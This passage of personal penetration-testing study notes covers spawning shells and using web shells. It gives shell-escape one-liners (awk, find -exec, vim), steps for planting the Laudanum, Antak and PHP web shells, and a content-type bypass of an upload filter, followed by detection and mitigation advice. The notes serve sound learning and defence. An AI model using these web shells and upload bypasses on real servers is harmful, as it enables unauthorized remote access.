```

**AWK Shell**
- AWK is a scripting language present on most Linux/Unix distributions
- this is how you can spawn a shell with AWK:
```shell-session
awk 'BEGIN {system("/bin/sh")}'
```

**Find Command Shell**
- besides it's finding capabilities, it can also be used to execute applications and invoke a shell interpreter
```shell-session
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
```
- this example searches for the AWK binary and uses it to execute an AWK shell

**Exec Shell**
```shell-session
find . -exec /bin/sh \; -quit
```

**Vim Shells**
```shell-session
vim -c ':!/bin/sh'
```
or
```shell-session
vim
:set shell=/bin/sh
:shell
```
### How to Check Permissions
- a very basic check would be:
```shell-session
ls -la <path/to/fileorbinary>
```
- to check what permissions the sudo account that we landed on has we can do:
```shell-session
sudo -l
```
==Note: Checking for permissions may lead to a potential attack vector.==
## Web Shells
- they're a browser-based shell session that lets us interact with the OS of a web server
### Laudanum
https://github.com/jbarcia/Web-Shells/tree/master/laudanum
- it contains web injectables
- already present on Parrot OS and Kali Linux

How to work with Laudanum:
1) First we need to take the specific shell that we need from `/usr/share/laudanum/` and copy it somewhere else in order to change it:
```shell-session
TonyS23@htb[/htb]$ cp /usr/share/laudanum/aspx/shell.aspx /home/tester/demo.aspx
```
2) Add your IP to the `allowedIps` list in the code (line 59):
![[modify-shell.webp]]
3) Upload the shell on the website
4) Navigate to the web shell in order to utilize it:
![[laud-nav.webp]]
### Antak Web Shell
- ASPX (Active Server Page Extender) is a file type/extension written for the ASP.NET framework (Microsoft) - it takes user's input and converts it to HTML on the server side
- Antak is a web shell included in the Nishang project (https://github.com/samratashok/nishang) which is an offensive PowerShell toolset useful in Windows pentests

How to work with Antak:
1) Antak can be found in `/usr/share/nishang/Antak-WebShell`
2) Move a copy somewhere
3) Modify the shell:
![[antak-changes.webp]]
- modify line 14 by adding a user and a password
4) Upload the shell and access it
### PHP Web Shells
- PHP - formerly known as Personal Home Page, now known as Hypertext Processor
- PHP is a **scripting language** for the server side of a web application
- real world example - when we fill out a login form on a `.php` page, the inputs are being processed on the server side using PHP

How to get a PHP web shell:
1) We will be using https://github.com/WhiteWinterWolf/wwwolf-php-webshell
2) Now we need to upload our shell but the website only allows images or gifs
3) To solve this, we will be using BurpSuite
4) We need to configure the browser with a proxy to our local network to ensure that requests pass through BurpSuite:
![[proxy_settings.webp]]
5) Our main goal will be to change the content type in order to bypass the file type restriction
6) After setting up the proxy we now need to forward the requests from BurpSuite:
![[burp.webp]]
8) After uploading the shell through the vendor logo upload feature of the website, click save and then forward the request through BurpSuite
9) Send the request to the repeater and change the content type of the request from `application/x-php` to `image/gif`
10) Now the shell is uploaded (doesn't  work like this)
## Detection and Prevention
### Monitoring
- [MITRE ATT&CK Framework](https://attack.mitre.org/) is a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations.
![[attack-framework.webp]]
==Note: C2 refers to Command and Control (a.k.a. when we have gained continued access to the victim).==
### Events to watch for
- **File uploads**: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser. Pay attention to application logs to determine if anyone has uploaded anything potentially malicious. The use of firewalls and anti-virus can add more layers to your security posture around the site. Any host exposed to the internet from your network should be sufficiently hardened and monitored.
- **Suspicious non-admin user actions**: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. When was the last time an average user, much less an admin, had to issue the command `whoami` on a host? Users connecting to a share on another host in the network over SMB that is not a normal infrastructure share can also be suspicious. This type of interaction usually is end host to infrastructure server, not end host to end host. Enabling security measures such as logging all user interactions, PowerShell logging, and other features that take note when a shell interface is used will provide you with more insight.
- **Anomalous network sessions**: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork. Logging and parsing NetFlow data can be a great way to spot anomalous network traffic. Looking at things such as top talkers, or unique site visits, watching for a heartbeat on a nonstandard port (like 4444, the default port used by Meterpreter), and monitoring any remote login attempts or bulk GET / POST requests in short amounts of time can all be indicators of compromise or attempted exploitation. Using tools like network monitors, firewall logs, and SIEMS can help bring a bit of order to the chaos that is network traffic.
### Potential Mitigations
- **Application Sandboxing**: By sandboxing your applications that are exposed to the world, you can limit the scope of access and damage an attacker can perform if they find a vulnerability or misconfiguration in the application.
- **Least Privilege Permission Policies**: Limiting the permissions users have can go a long way to help stop unauthorized access or compromise. Does an ordinary user need administrative access to perform their daily duties? What about domain admin? Not really, right? Ensuring proper security policies and permissions are in place will often hinder if not outright stop an attack.
- **Host Segmentation & Hardening**: Properly hardening hosts and segregating any hosts that require exposure to the internet can help ensure an attacker cannot easily hop in and move laterally into your network if they gain access to a boundary host. Following STIG hardening guides and placing hosts such as web servers, VPN servers, etc., in a DMZ or 'quarantine' network segment will stop that type of access and lateral movement.
- **Physical and Application Layer Firewalls**: Firewalls can be powerful tools if appropriately implemented. Proper inbound and outbound rules that only allow traffic first established from within your network, on ports approved for your applications, and denying inbound traffic from your network addresses or other prohibited IP space can cripple many bind and reverse shells. It adds a hop in the network chain, and network implementations such as Network Address Translation (NAT) can break the functionality of a shell payload if it is not taken into account.

# Useful Links:

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md // reverse shells cheat sheet
https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1 // useful PowerShell scripts
https://github.com/jbarcia/Web-Shells/tree/master/laudanum // Laudanum
https://ippsec.rocks/?# // Ippsec site for learning 
https://github.com/samratashok/nishang // Nishang project
https://github.com/WhiteWinterWolf/wwwolf-php-webshell // PHP web shell